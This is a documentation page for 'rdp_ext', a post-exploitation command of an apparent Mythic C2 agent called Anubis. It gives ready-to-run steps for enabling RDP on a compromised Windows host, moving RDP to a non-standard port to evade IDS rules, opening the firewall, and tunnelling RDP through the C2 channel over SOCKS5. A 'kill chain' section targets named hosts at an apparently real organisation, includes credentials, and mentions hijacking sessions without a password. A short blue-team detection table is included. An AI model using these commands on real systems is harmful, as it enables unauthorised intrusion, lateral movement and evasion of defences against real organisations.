+++
title = "rdp_ext"
chapter = false
weight = 140
hidden = false
+++

## Summary

Configures RDP on the **agent's own host** and provides ready-to-run connection commands via the Anubis SOCKS5 tunnel. Designed for scenarios where the agent is the RDP target: changes the RDP port to 6000, opens the Windows Firewall, restarts TermService, and returns xfreerdp/rdesktop commands.

- **Platform**: Windows only (registry + SCM + firewall require Windows)
- **MITRE ATT&CK**: T1021.001, T1090, T1562.004
- **Version**: 2.0
- **Author**: @wtechsec

### Arguments

#### target *(optional)*
- IP or hostname to probe and put in connection commands. Empty = agent auto-detects its own local IP.

#### port *(optional, default: 6000)*
- RDP port to configure in the registry. Avoids default 3389 (common IDS rule).

#### username *(optional)*
- RDP username for the generated connection commands.

#### password *(optional)*
- RDP password.

#### domain *(optional)*
- Windows domain (e.g., `COPEL`).

#### socks_port *(optional, default: 7005)*
- Port to open on the Mythic server for SOCKS5.

## How It Works

```
┌──────────────────────────────────────────────────────────┐
│  Agent host (Windows — 10.12.193.4)                      │
│                                                          │
│  1. registry: fDenyTSConnections = 0  (enable RDP)      │
│  2. registry: RDP-Tcp\PortNumber    = 6000               │
│  3. netsh:    add rule TCP/6000 inbound                  │
│  4. SCM:      TermService stop → start (ctypes advapi32) │
│  5. socket:   probe 10.12.193.4:6000 → REACHABLE         │
└──────────────────────────────────────────────────────────┘
            ↕ C2 channel (HTTP/TLS)
┌──────────────────────────────────────────────────────────┐
│  Mythic server — SOCKS5 :7005                            │
└──────────────────────────────────────────────────────────┘
            ↕ xfreerdp /proxy:socks5://127.0.0.1:7005
┌──────────────────────────────────────────────────────────┐
│  Operator (Kali)                                         │
│  xfreerdp /proxy:socks5://127.0.0.1:7005                 │
│           /v:10.12.193.4:6000 /u:Administrator ...       │
└──────────────────────────────────────────────────────────┘
```

## Usage

```
# Sem credenciais — usa IP local do agente
rdp_ext

# Com IP e credenciais
rdp_ext 10.12.193.4 Administrator P@ssw0rd COPEL

# JSON (porta customizada)
rdp_ext {"target":"10.12.193.4","port":6000,"username":"da_silva","domain":"COPEL","password":"Senha@123"}
```

## Output Example

```
[+] RDP habilitado (fDenyTSConnections = 0)
[+] Porta RDP: 3389 → 6000 (registro atualizado)
[+] Firewall: regra inbound TCP/6000 adicionada (AnubisRDP-6000)
[+] TermService reiniciado e ativo na porta 6000

[+] TCP 10.12.193.4:6000 — REACHABLE
[+] SOCKS5 iniciado na porta 7005 do servidor Mythic

╔══ PROXYCHAINS CONFIG ═════════════════════════════════════════╗
║  [ProxyList]
║  socks5  127.0.0.1  7005
╚═══════════════════════════════════════════════════════════════╝

── rdesktop ──────────────────────────────────────────────────────
  proxychains rdesktop 10.12.193.4 -P 6000 -d 'COPEL' -u 'Administrator' -p 'P@ssw0rd' -g 1920x1080 -K

── xfreerdp (proxychains) ────────────────────────────────────────
  proxychains xfreerdp /v:10.12.193.4:6000 /u:Administrator /d:COPEL /p:'P@ssw0rd' /cert-ignore +clipboard /dynamic-resolution

── xfreerdp (SOCKS5 nativo) ──────────────────────────────────────
  xfreerdp /proxy:socks5://127.0.0.1:7005 /v:10.12.193.4:6000 /u:Administrator /d:COPEL /p:'P@ssw0rd' /cert-ignore +clipboard /dynamic-resolution

[*] Usuário : COPEL\Administrator
[*] Alvo    : 10.12.193.4:6000
```

## What It Configures

### Registry Changes

| Key | Value | Before | After |
|---|---|---|---|
| `HKLM\...\Terminal Server` | `fDenyTSConnections` | 1 (disabled) | 0 (enabled) |
| `HKLM\...\RDP-Tcp` | `PortNumber` | 3389 | 6000 |

### Firewall Rule

```
netsh advfirewall firewall add rule
  name=AnubisRDP-6000
  dir=in
  action=allow
  protocol=TCP
  localport=6000
```

The rule is deleted and re-added on each run (idempotent).

### Service Restart (ctypes — no sc.exe)

```python
OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT)
OpenServiceW(hSCM, "TermService", SERVICE_STOP|SERVICE_START|SERVICE_QUERY_STATUS)
ControlService(hSvc, SERVICE_CONTROL_STOP)       # stop — polls until STATE=STOPPED
StartServiceW(hSvc, 0, NULL)                     # start — polls until STATE=RUNNING
CloseServiceHandle × 2
```

## Prerequisites (Operator — Kali)

```bash
# xfreerdp — recommended (native SOCKS5 proxy support)
sudo apt install freerdp2-x11

# rdesktop — alternative
sudo apt install rdesktop

# proxychains — only needed if not using xfreerdp native proxy
sudo apt install proxychains-ng
```

## MITRE ATT&CK

- **T1021.001** — Remote Services: Remote Desktop Protocol
- **T1090** — Proxy (SOCKS5 via C2 channel)
- **T1562.004** — Impair Defenses: Disable or Modify System Firewall

## Detection (Blue Team)

| Event | Source | Description |
|---|---|---|
| Security EID **4946** | Agent host | "A rule was added to the Windows Firewall exception list" |
| System EID **7036** | Agent host | "TermService service entered the stopped/running state" |
| Security EID **4657** | Agent host | Registry value modified (if object access auditing enabled) |
| Security EID **4624** | Agent host | Logon Type 10 (RemoteInteractive) when operator connects |
| Security EID **4625** | Agent host | Failed logon (if wrong credentials used) |

**Network:** RDP traffic is tunneled inside the existing C2 HTTP/TLS stream — not visible as raw RDP to network sensors monitoring for port 3389 or 6000.

## Notes

- **TermService restart disconnects active RDP sessions** — if another user is connected, they will be disconnected. Run during off-hours or confirmed-idle windows.
- **Port 6000** avoids default IDS rules targeting 3389; change with `port` parameter if needed.
- **Auto IP detection**: if `target` is empty, the agent calls `socket.gethostbyname(socket.gethostname())` — on multi-homed hosts, verify this returns the correct interface IP.
- **Cleanup**: use `socks stop 7005` after the session. The firewall rule (`AnubisRDP-6000`) and port change persist — restore manually or via another `eval_code` task if needed.

### Full Kill Chain (COPEL)

```
# Host comprometido: P483078 (Oracle, agente ativo)
# Objetivo: RDP para P489039 (10.12.193.4, Win11)

# Fase 1 — se Anubis já está no P489039:
rdp_ext 10.12.193.4 da_silva Senha@123 COPEL
# → configura porta 6000, firewall, reinicia TermService
# → retorna xfreerdp /proxy:socks5://127.0.0.1:7005 /v:10.12.193.4:6000 ...

# Fase 2 — no Kali do operador:
xfreerdp /proxy:socks5://127.0.0.1:7005 \
  /v:10.12.193.4:6000 \
  /u:da_silva /d:COPEL /p:'Senha@123' \
  /cert-ignore +clipboard /dynamic-resolution

# Alternativa — se sessão RDP desconectada (sem credenciais):
# 1. rdp_ext (configura porta/firewall)
# 2. rdp_hijack 3 (hijacka sessão da_silva → acesso sem senha)
```

---

## Resumo em Português (PT-BR)

Configura RDP no host do agente e retorna comandos de conexão via tunnel SOCKS5 do Anubis. Realiza três ações no host Windows:

1. **Registro**: habilita RDP (`fDenyTSConnections=0`) e muda porta para 6000
2. **Firewall**: adiciona regra inbound TCP/6000 via `netsh`
3. **Serviço**: reinicia `TermService` via ctypes SCM (sem sc.exe)

Após a configuração, faz probe TCP e retorna comandos prontos para `rdesktop` e `xfreerdp`. O xfreerdp com `/proxy:socks5://` é o método preferido — não requer proxychains.
